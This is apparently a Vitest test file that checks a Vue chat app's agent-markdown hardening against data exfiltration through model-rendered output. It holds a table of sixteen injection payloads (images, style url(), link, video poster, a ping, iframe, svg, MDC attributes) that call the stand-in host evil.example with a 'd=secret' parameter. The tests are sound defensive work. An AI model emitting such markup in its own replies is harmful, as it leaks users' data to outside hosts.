// @vitest-environment happy-dom
//
// C1 (79b fix rounds 1–2): render model text through the REAL vue-stream-markdown <Markdown> with
// the exact props MessageResponse/ReasoningContent bind, and assert no element or attribute in the
// resulting DOM references the attacker's host — for every raw-HTML / MDC / markdown vector.
import { describe, expect, it, vi } from 'vitest'
import { createApp, h, nextTick } from 'vue'
import { Markdown } from 'vue-stream-markdown'
import { agentMarkdownProps, isAllowedAgentImage, sanitizeAgentNodes } from './markdown-harden'

vi.spyOn(console, 'warn').mockImplementation(() => {})
vi.spyOn(console, 'log').mockImplementation(() => {})

async function render(content: string, props: Record<string, unknown> = agentMarkdownProps, mode: 'static' | 'streaming' = 'static'): Promise<HTMLElement> {
  const el = document.createElement('div')
  document.body.appendChild(el)
  createApp({ render: () => h(Markdown, { content, mode, ...props }) }).mount(el)
  // parse is async; give it a few macrotasks + a render flush
  for (let i = 0; i < 5; i++) { await new Promise(r => setTimeout(r, 0)); await nextTick() }
  return el
}

/** Any attribute value referencing the attacker host, and any tag that can fetch on its own.
 *  (`<svg>` is not listed: the library's own code-block icons are inline svg; an injected svg
 *  shows up through its `href`/`style` attribute values instead.) */
function leaks(el: HTMLElement): string[] {
  const out: string[] = []
  for (const n of [el, ...el.querySelectorAll('*')]) {
    for (const a of [...n.attributes]) if (/evil/i.test(a.value)) out.push(`${n.tagName.toLowerCase()}[${a.name}]=${a.value}`)
    if (/^(style|link|video|audio|source|picture|iframe|object|embed|script|image)$/i.test(n.tagName)) out.push(`<${n.tagName.toLowerCase()}>`)
  }
  return out
}

const E = 'https://evil.example'
const VECTORS: Record<string, string> = {
  'markdown image': `![a](${E}/p.png?d=secret)`,
  'reference image': `![b][r]\n\n[r]: ${E}/ref.png?d=secret`,
  'protocol-relative image': `![c](//evil.example/pr.png?d=secret)`,
  'data: image': '![d](data:image/png;base64,iVBORw0KGgo=)',
  'raw <img>': `<img src="${E}/html.png?d=secret">`,
  '<style> url()': `<style>p{background:url(${E}/s.png?d=secret)}</style>\n\ntext`,
  '<link rel=stylesheet>': `<link rel="stylesheet" href="${E}/x.css?d=secret">`,
  'inline style=url()': `<div style="background:url(${E}/bg.png?d=secret)">hi</div>`,
  'span style=url(//)': `<span style="background-image:url(//evil.example/b.png)">hi</span>`,
  '<video poster>': `<video poster="${E}/poster.png?d=secret"></video>`,
  '<picture><source srcset>': `<picture><source srcset="${E}/src.png?d=secret"><img src="/api/images/ok/raw"></picture>`,
  '<a ping>': `<a href="https://ok.example" ping="${E}/ping?d=secret">x</a>`,
  'MDC attributes on markdown': `**s**{style="background:url(${E}/mdc.png)" ping="${E}/p"}`,
  'MDC component with style': `::callout{style="background:url(${E}/c.png)"}\nhi\n::`,
  '<svg><image href>': `<svg><image href="${E}/svg.png"></image></svg>`,
  '<iframe>': `<iframe src="${E}/frame"></iframe>`
}

describe('agent markdown hardening — real renderer (C1)', () => {
  it.each(Object.entries(VECTORS))('%s: nothing in the DOM references the attacker host', async (_name, md) => {
    expect(leaks(await render(md))).toEqual([])
  })

  it.each(Object.entries(VECTORS))('%s: also safe in streaming mode', async (_name, md) => {
    expect(leaks(await render(md, agentMarkdownProps, 'streaming'))).toEqual([])
  })

  it('NOT vacuous: hardenOptions alone (round 1) still leaks the raw-HTML / MDC vectors', async () => {
    const { parserOptions: _p, ...round1 } = agentMarkdownProps
    const leaked = []
    for (const k of ['<style> url()', 'inline style=url()', '<video poster>', '<a ping>', 'MDC attributes on markdown']) {
      if (leaks(await render(VECTORS[k]!, round1)).length) leaked.push(k)
    }
    expect(leaked.length).toBeGreaterThanOrEqual(4)
  })

  it('normal markdown still renders: bold, list, code, table alignment, link, task list, /api/images image', async () => {
    const el = await render('**bold** and `code`\n\n- one\n- [x] done\n\n```ts\nconst x = 1\n```\n\n| a | b |\n|:-|-:|\n| 1 | 2 |\n\n[docs](https://docs.example)\n\n![cat](/api/images/img1/raw)')
    expect(el.querySelector('strong')?.textContent).toBe('bold')
    expect(el.querySelectorAll('li').length).toBeGreaterThanOrEqual(2)
    expect(el.textContent).toContain('const x = 1')
    expect(el.querySelector('th')?.getAttribute('style')).toMatch(/text-align/)
    expect(el.querySelector('a[href^="https://docs.example"]')).not.toBeNull()
    expect(el.querySelector('img')?.getAttribute('src')).toBe('/api/images/img1/raw')
  })

  it('a blocked image becomes its alt text (no spinner, no request)', async () => {
    const el = await render(`![invoice totals](${E}/p.png)`)
    expect(el.querySelector('img')).toBeNull()
    expect(el.textContent).toContain('invoice totals')
  })
})

describe('isAllowedAgentImage / sanitizeAgentNodes', () => {
  it.each(['/api/images/x/raw', '/api/images/abc'])('allows %s', s => expect(isAllowedAgentImage(s)).toBe(true))
  it.each(['https://evil.example/x', '//evil.example/x', '/api/images/../../api/health', '/api/images//evil.example', '/x', 'data:image/png;base64,x', undefined])
  ('refuses %s', s => expect(isAllowedAgentImage(s)).toBe(false))
  it('drops style/link content, unwraps div, strips non-allowlisted attributes', () => {
    expect(sanitizeAgentNodes([
      ['style', {}, 'p{}'],
      ['div', { style: 'x' }, 'kept'],
      ['strong', { style: 'background:url(x)', ping: 'y', class: 'ok' }, 'b'],
      ['th', { style: 'text-align:left' }, 'h'],
      ['th', { style: 'text-align:left;background:url(x)' }, 'h2']
    ])).toEqual(['kept', ['strong', { class: 'ok' }, 'b'], ['th', { style: 'text-align:left' }, 'h'], ['th', {}, 'h2']])
  })
})
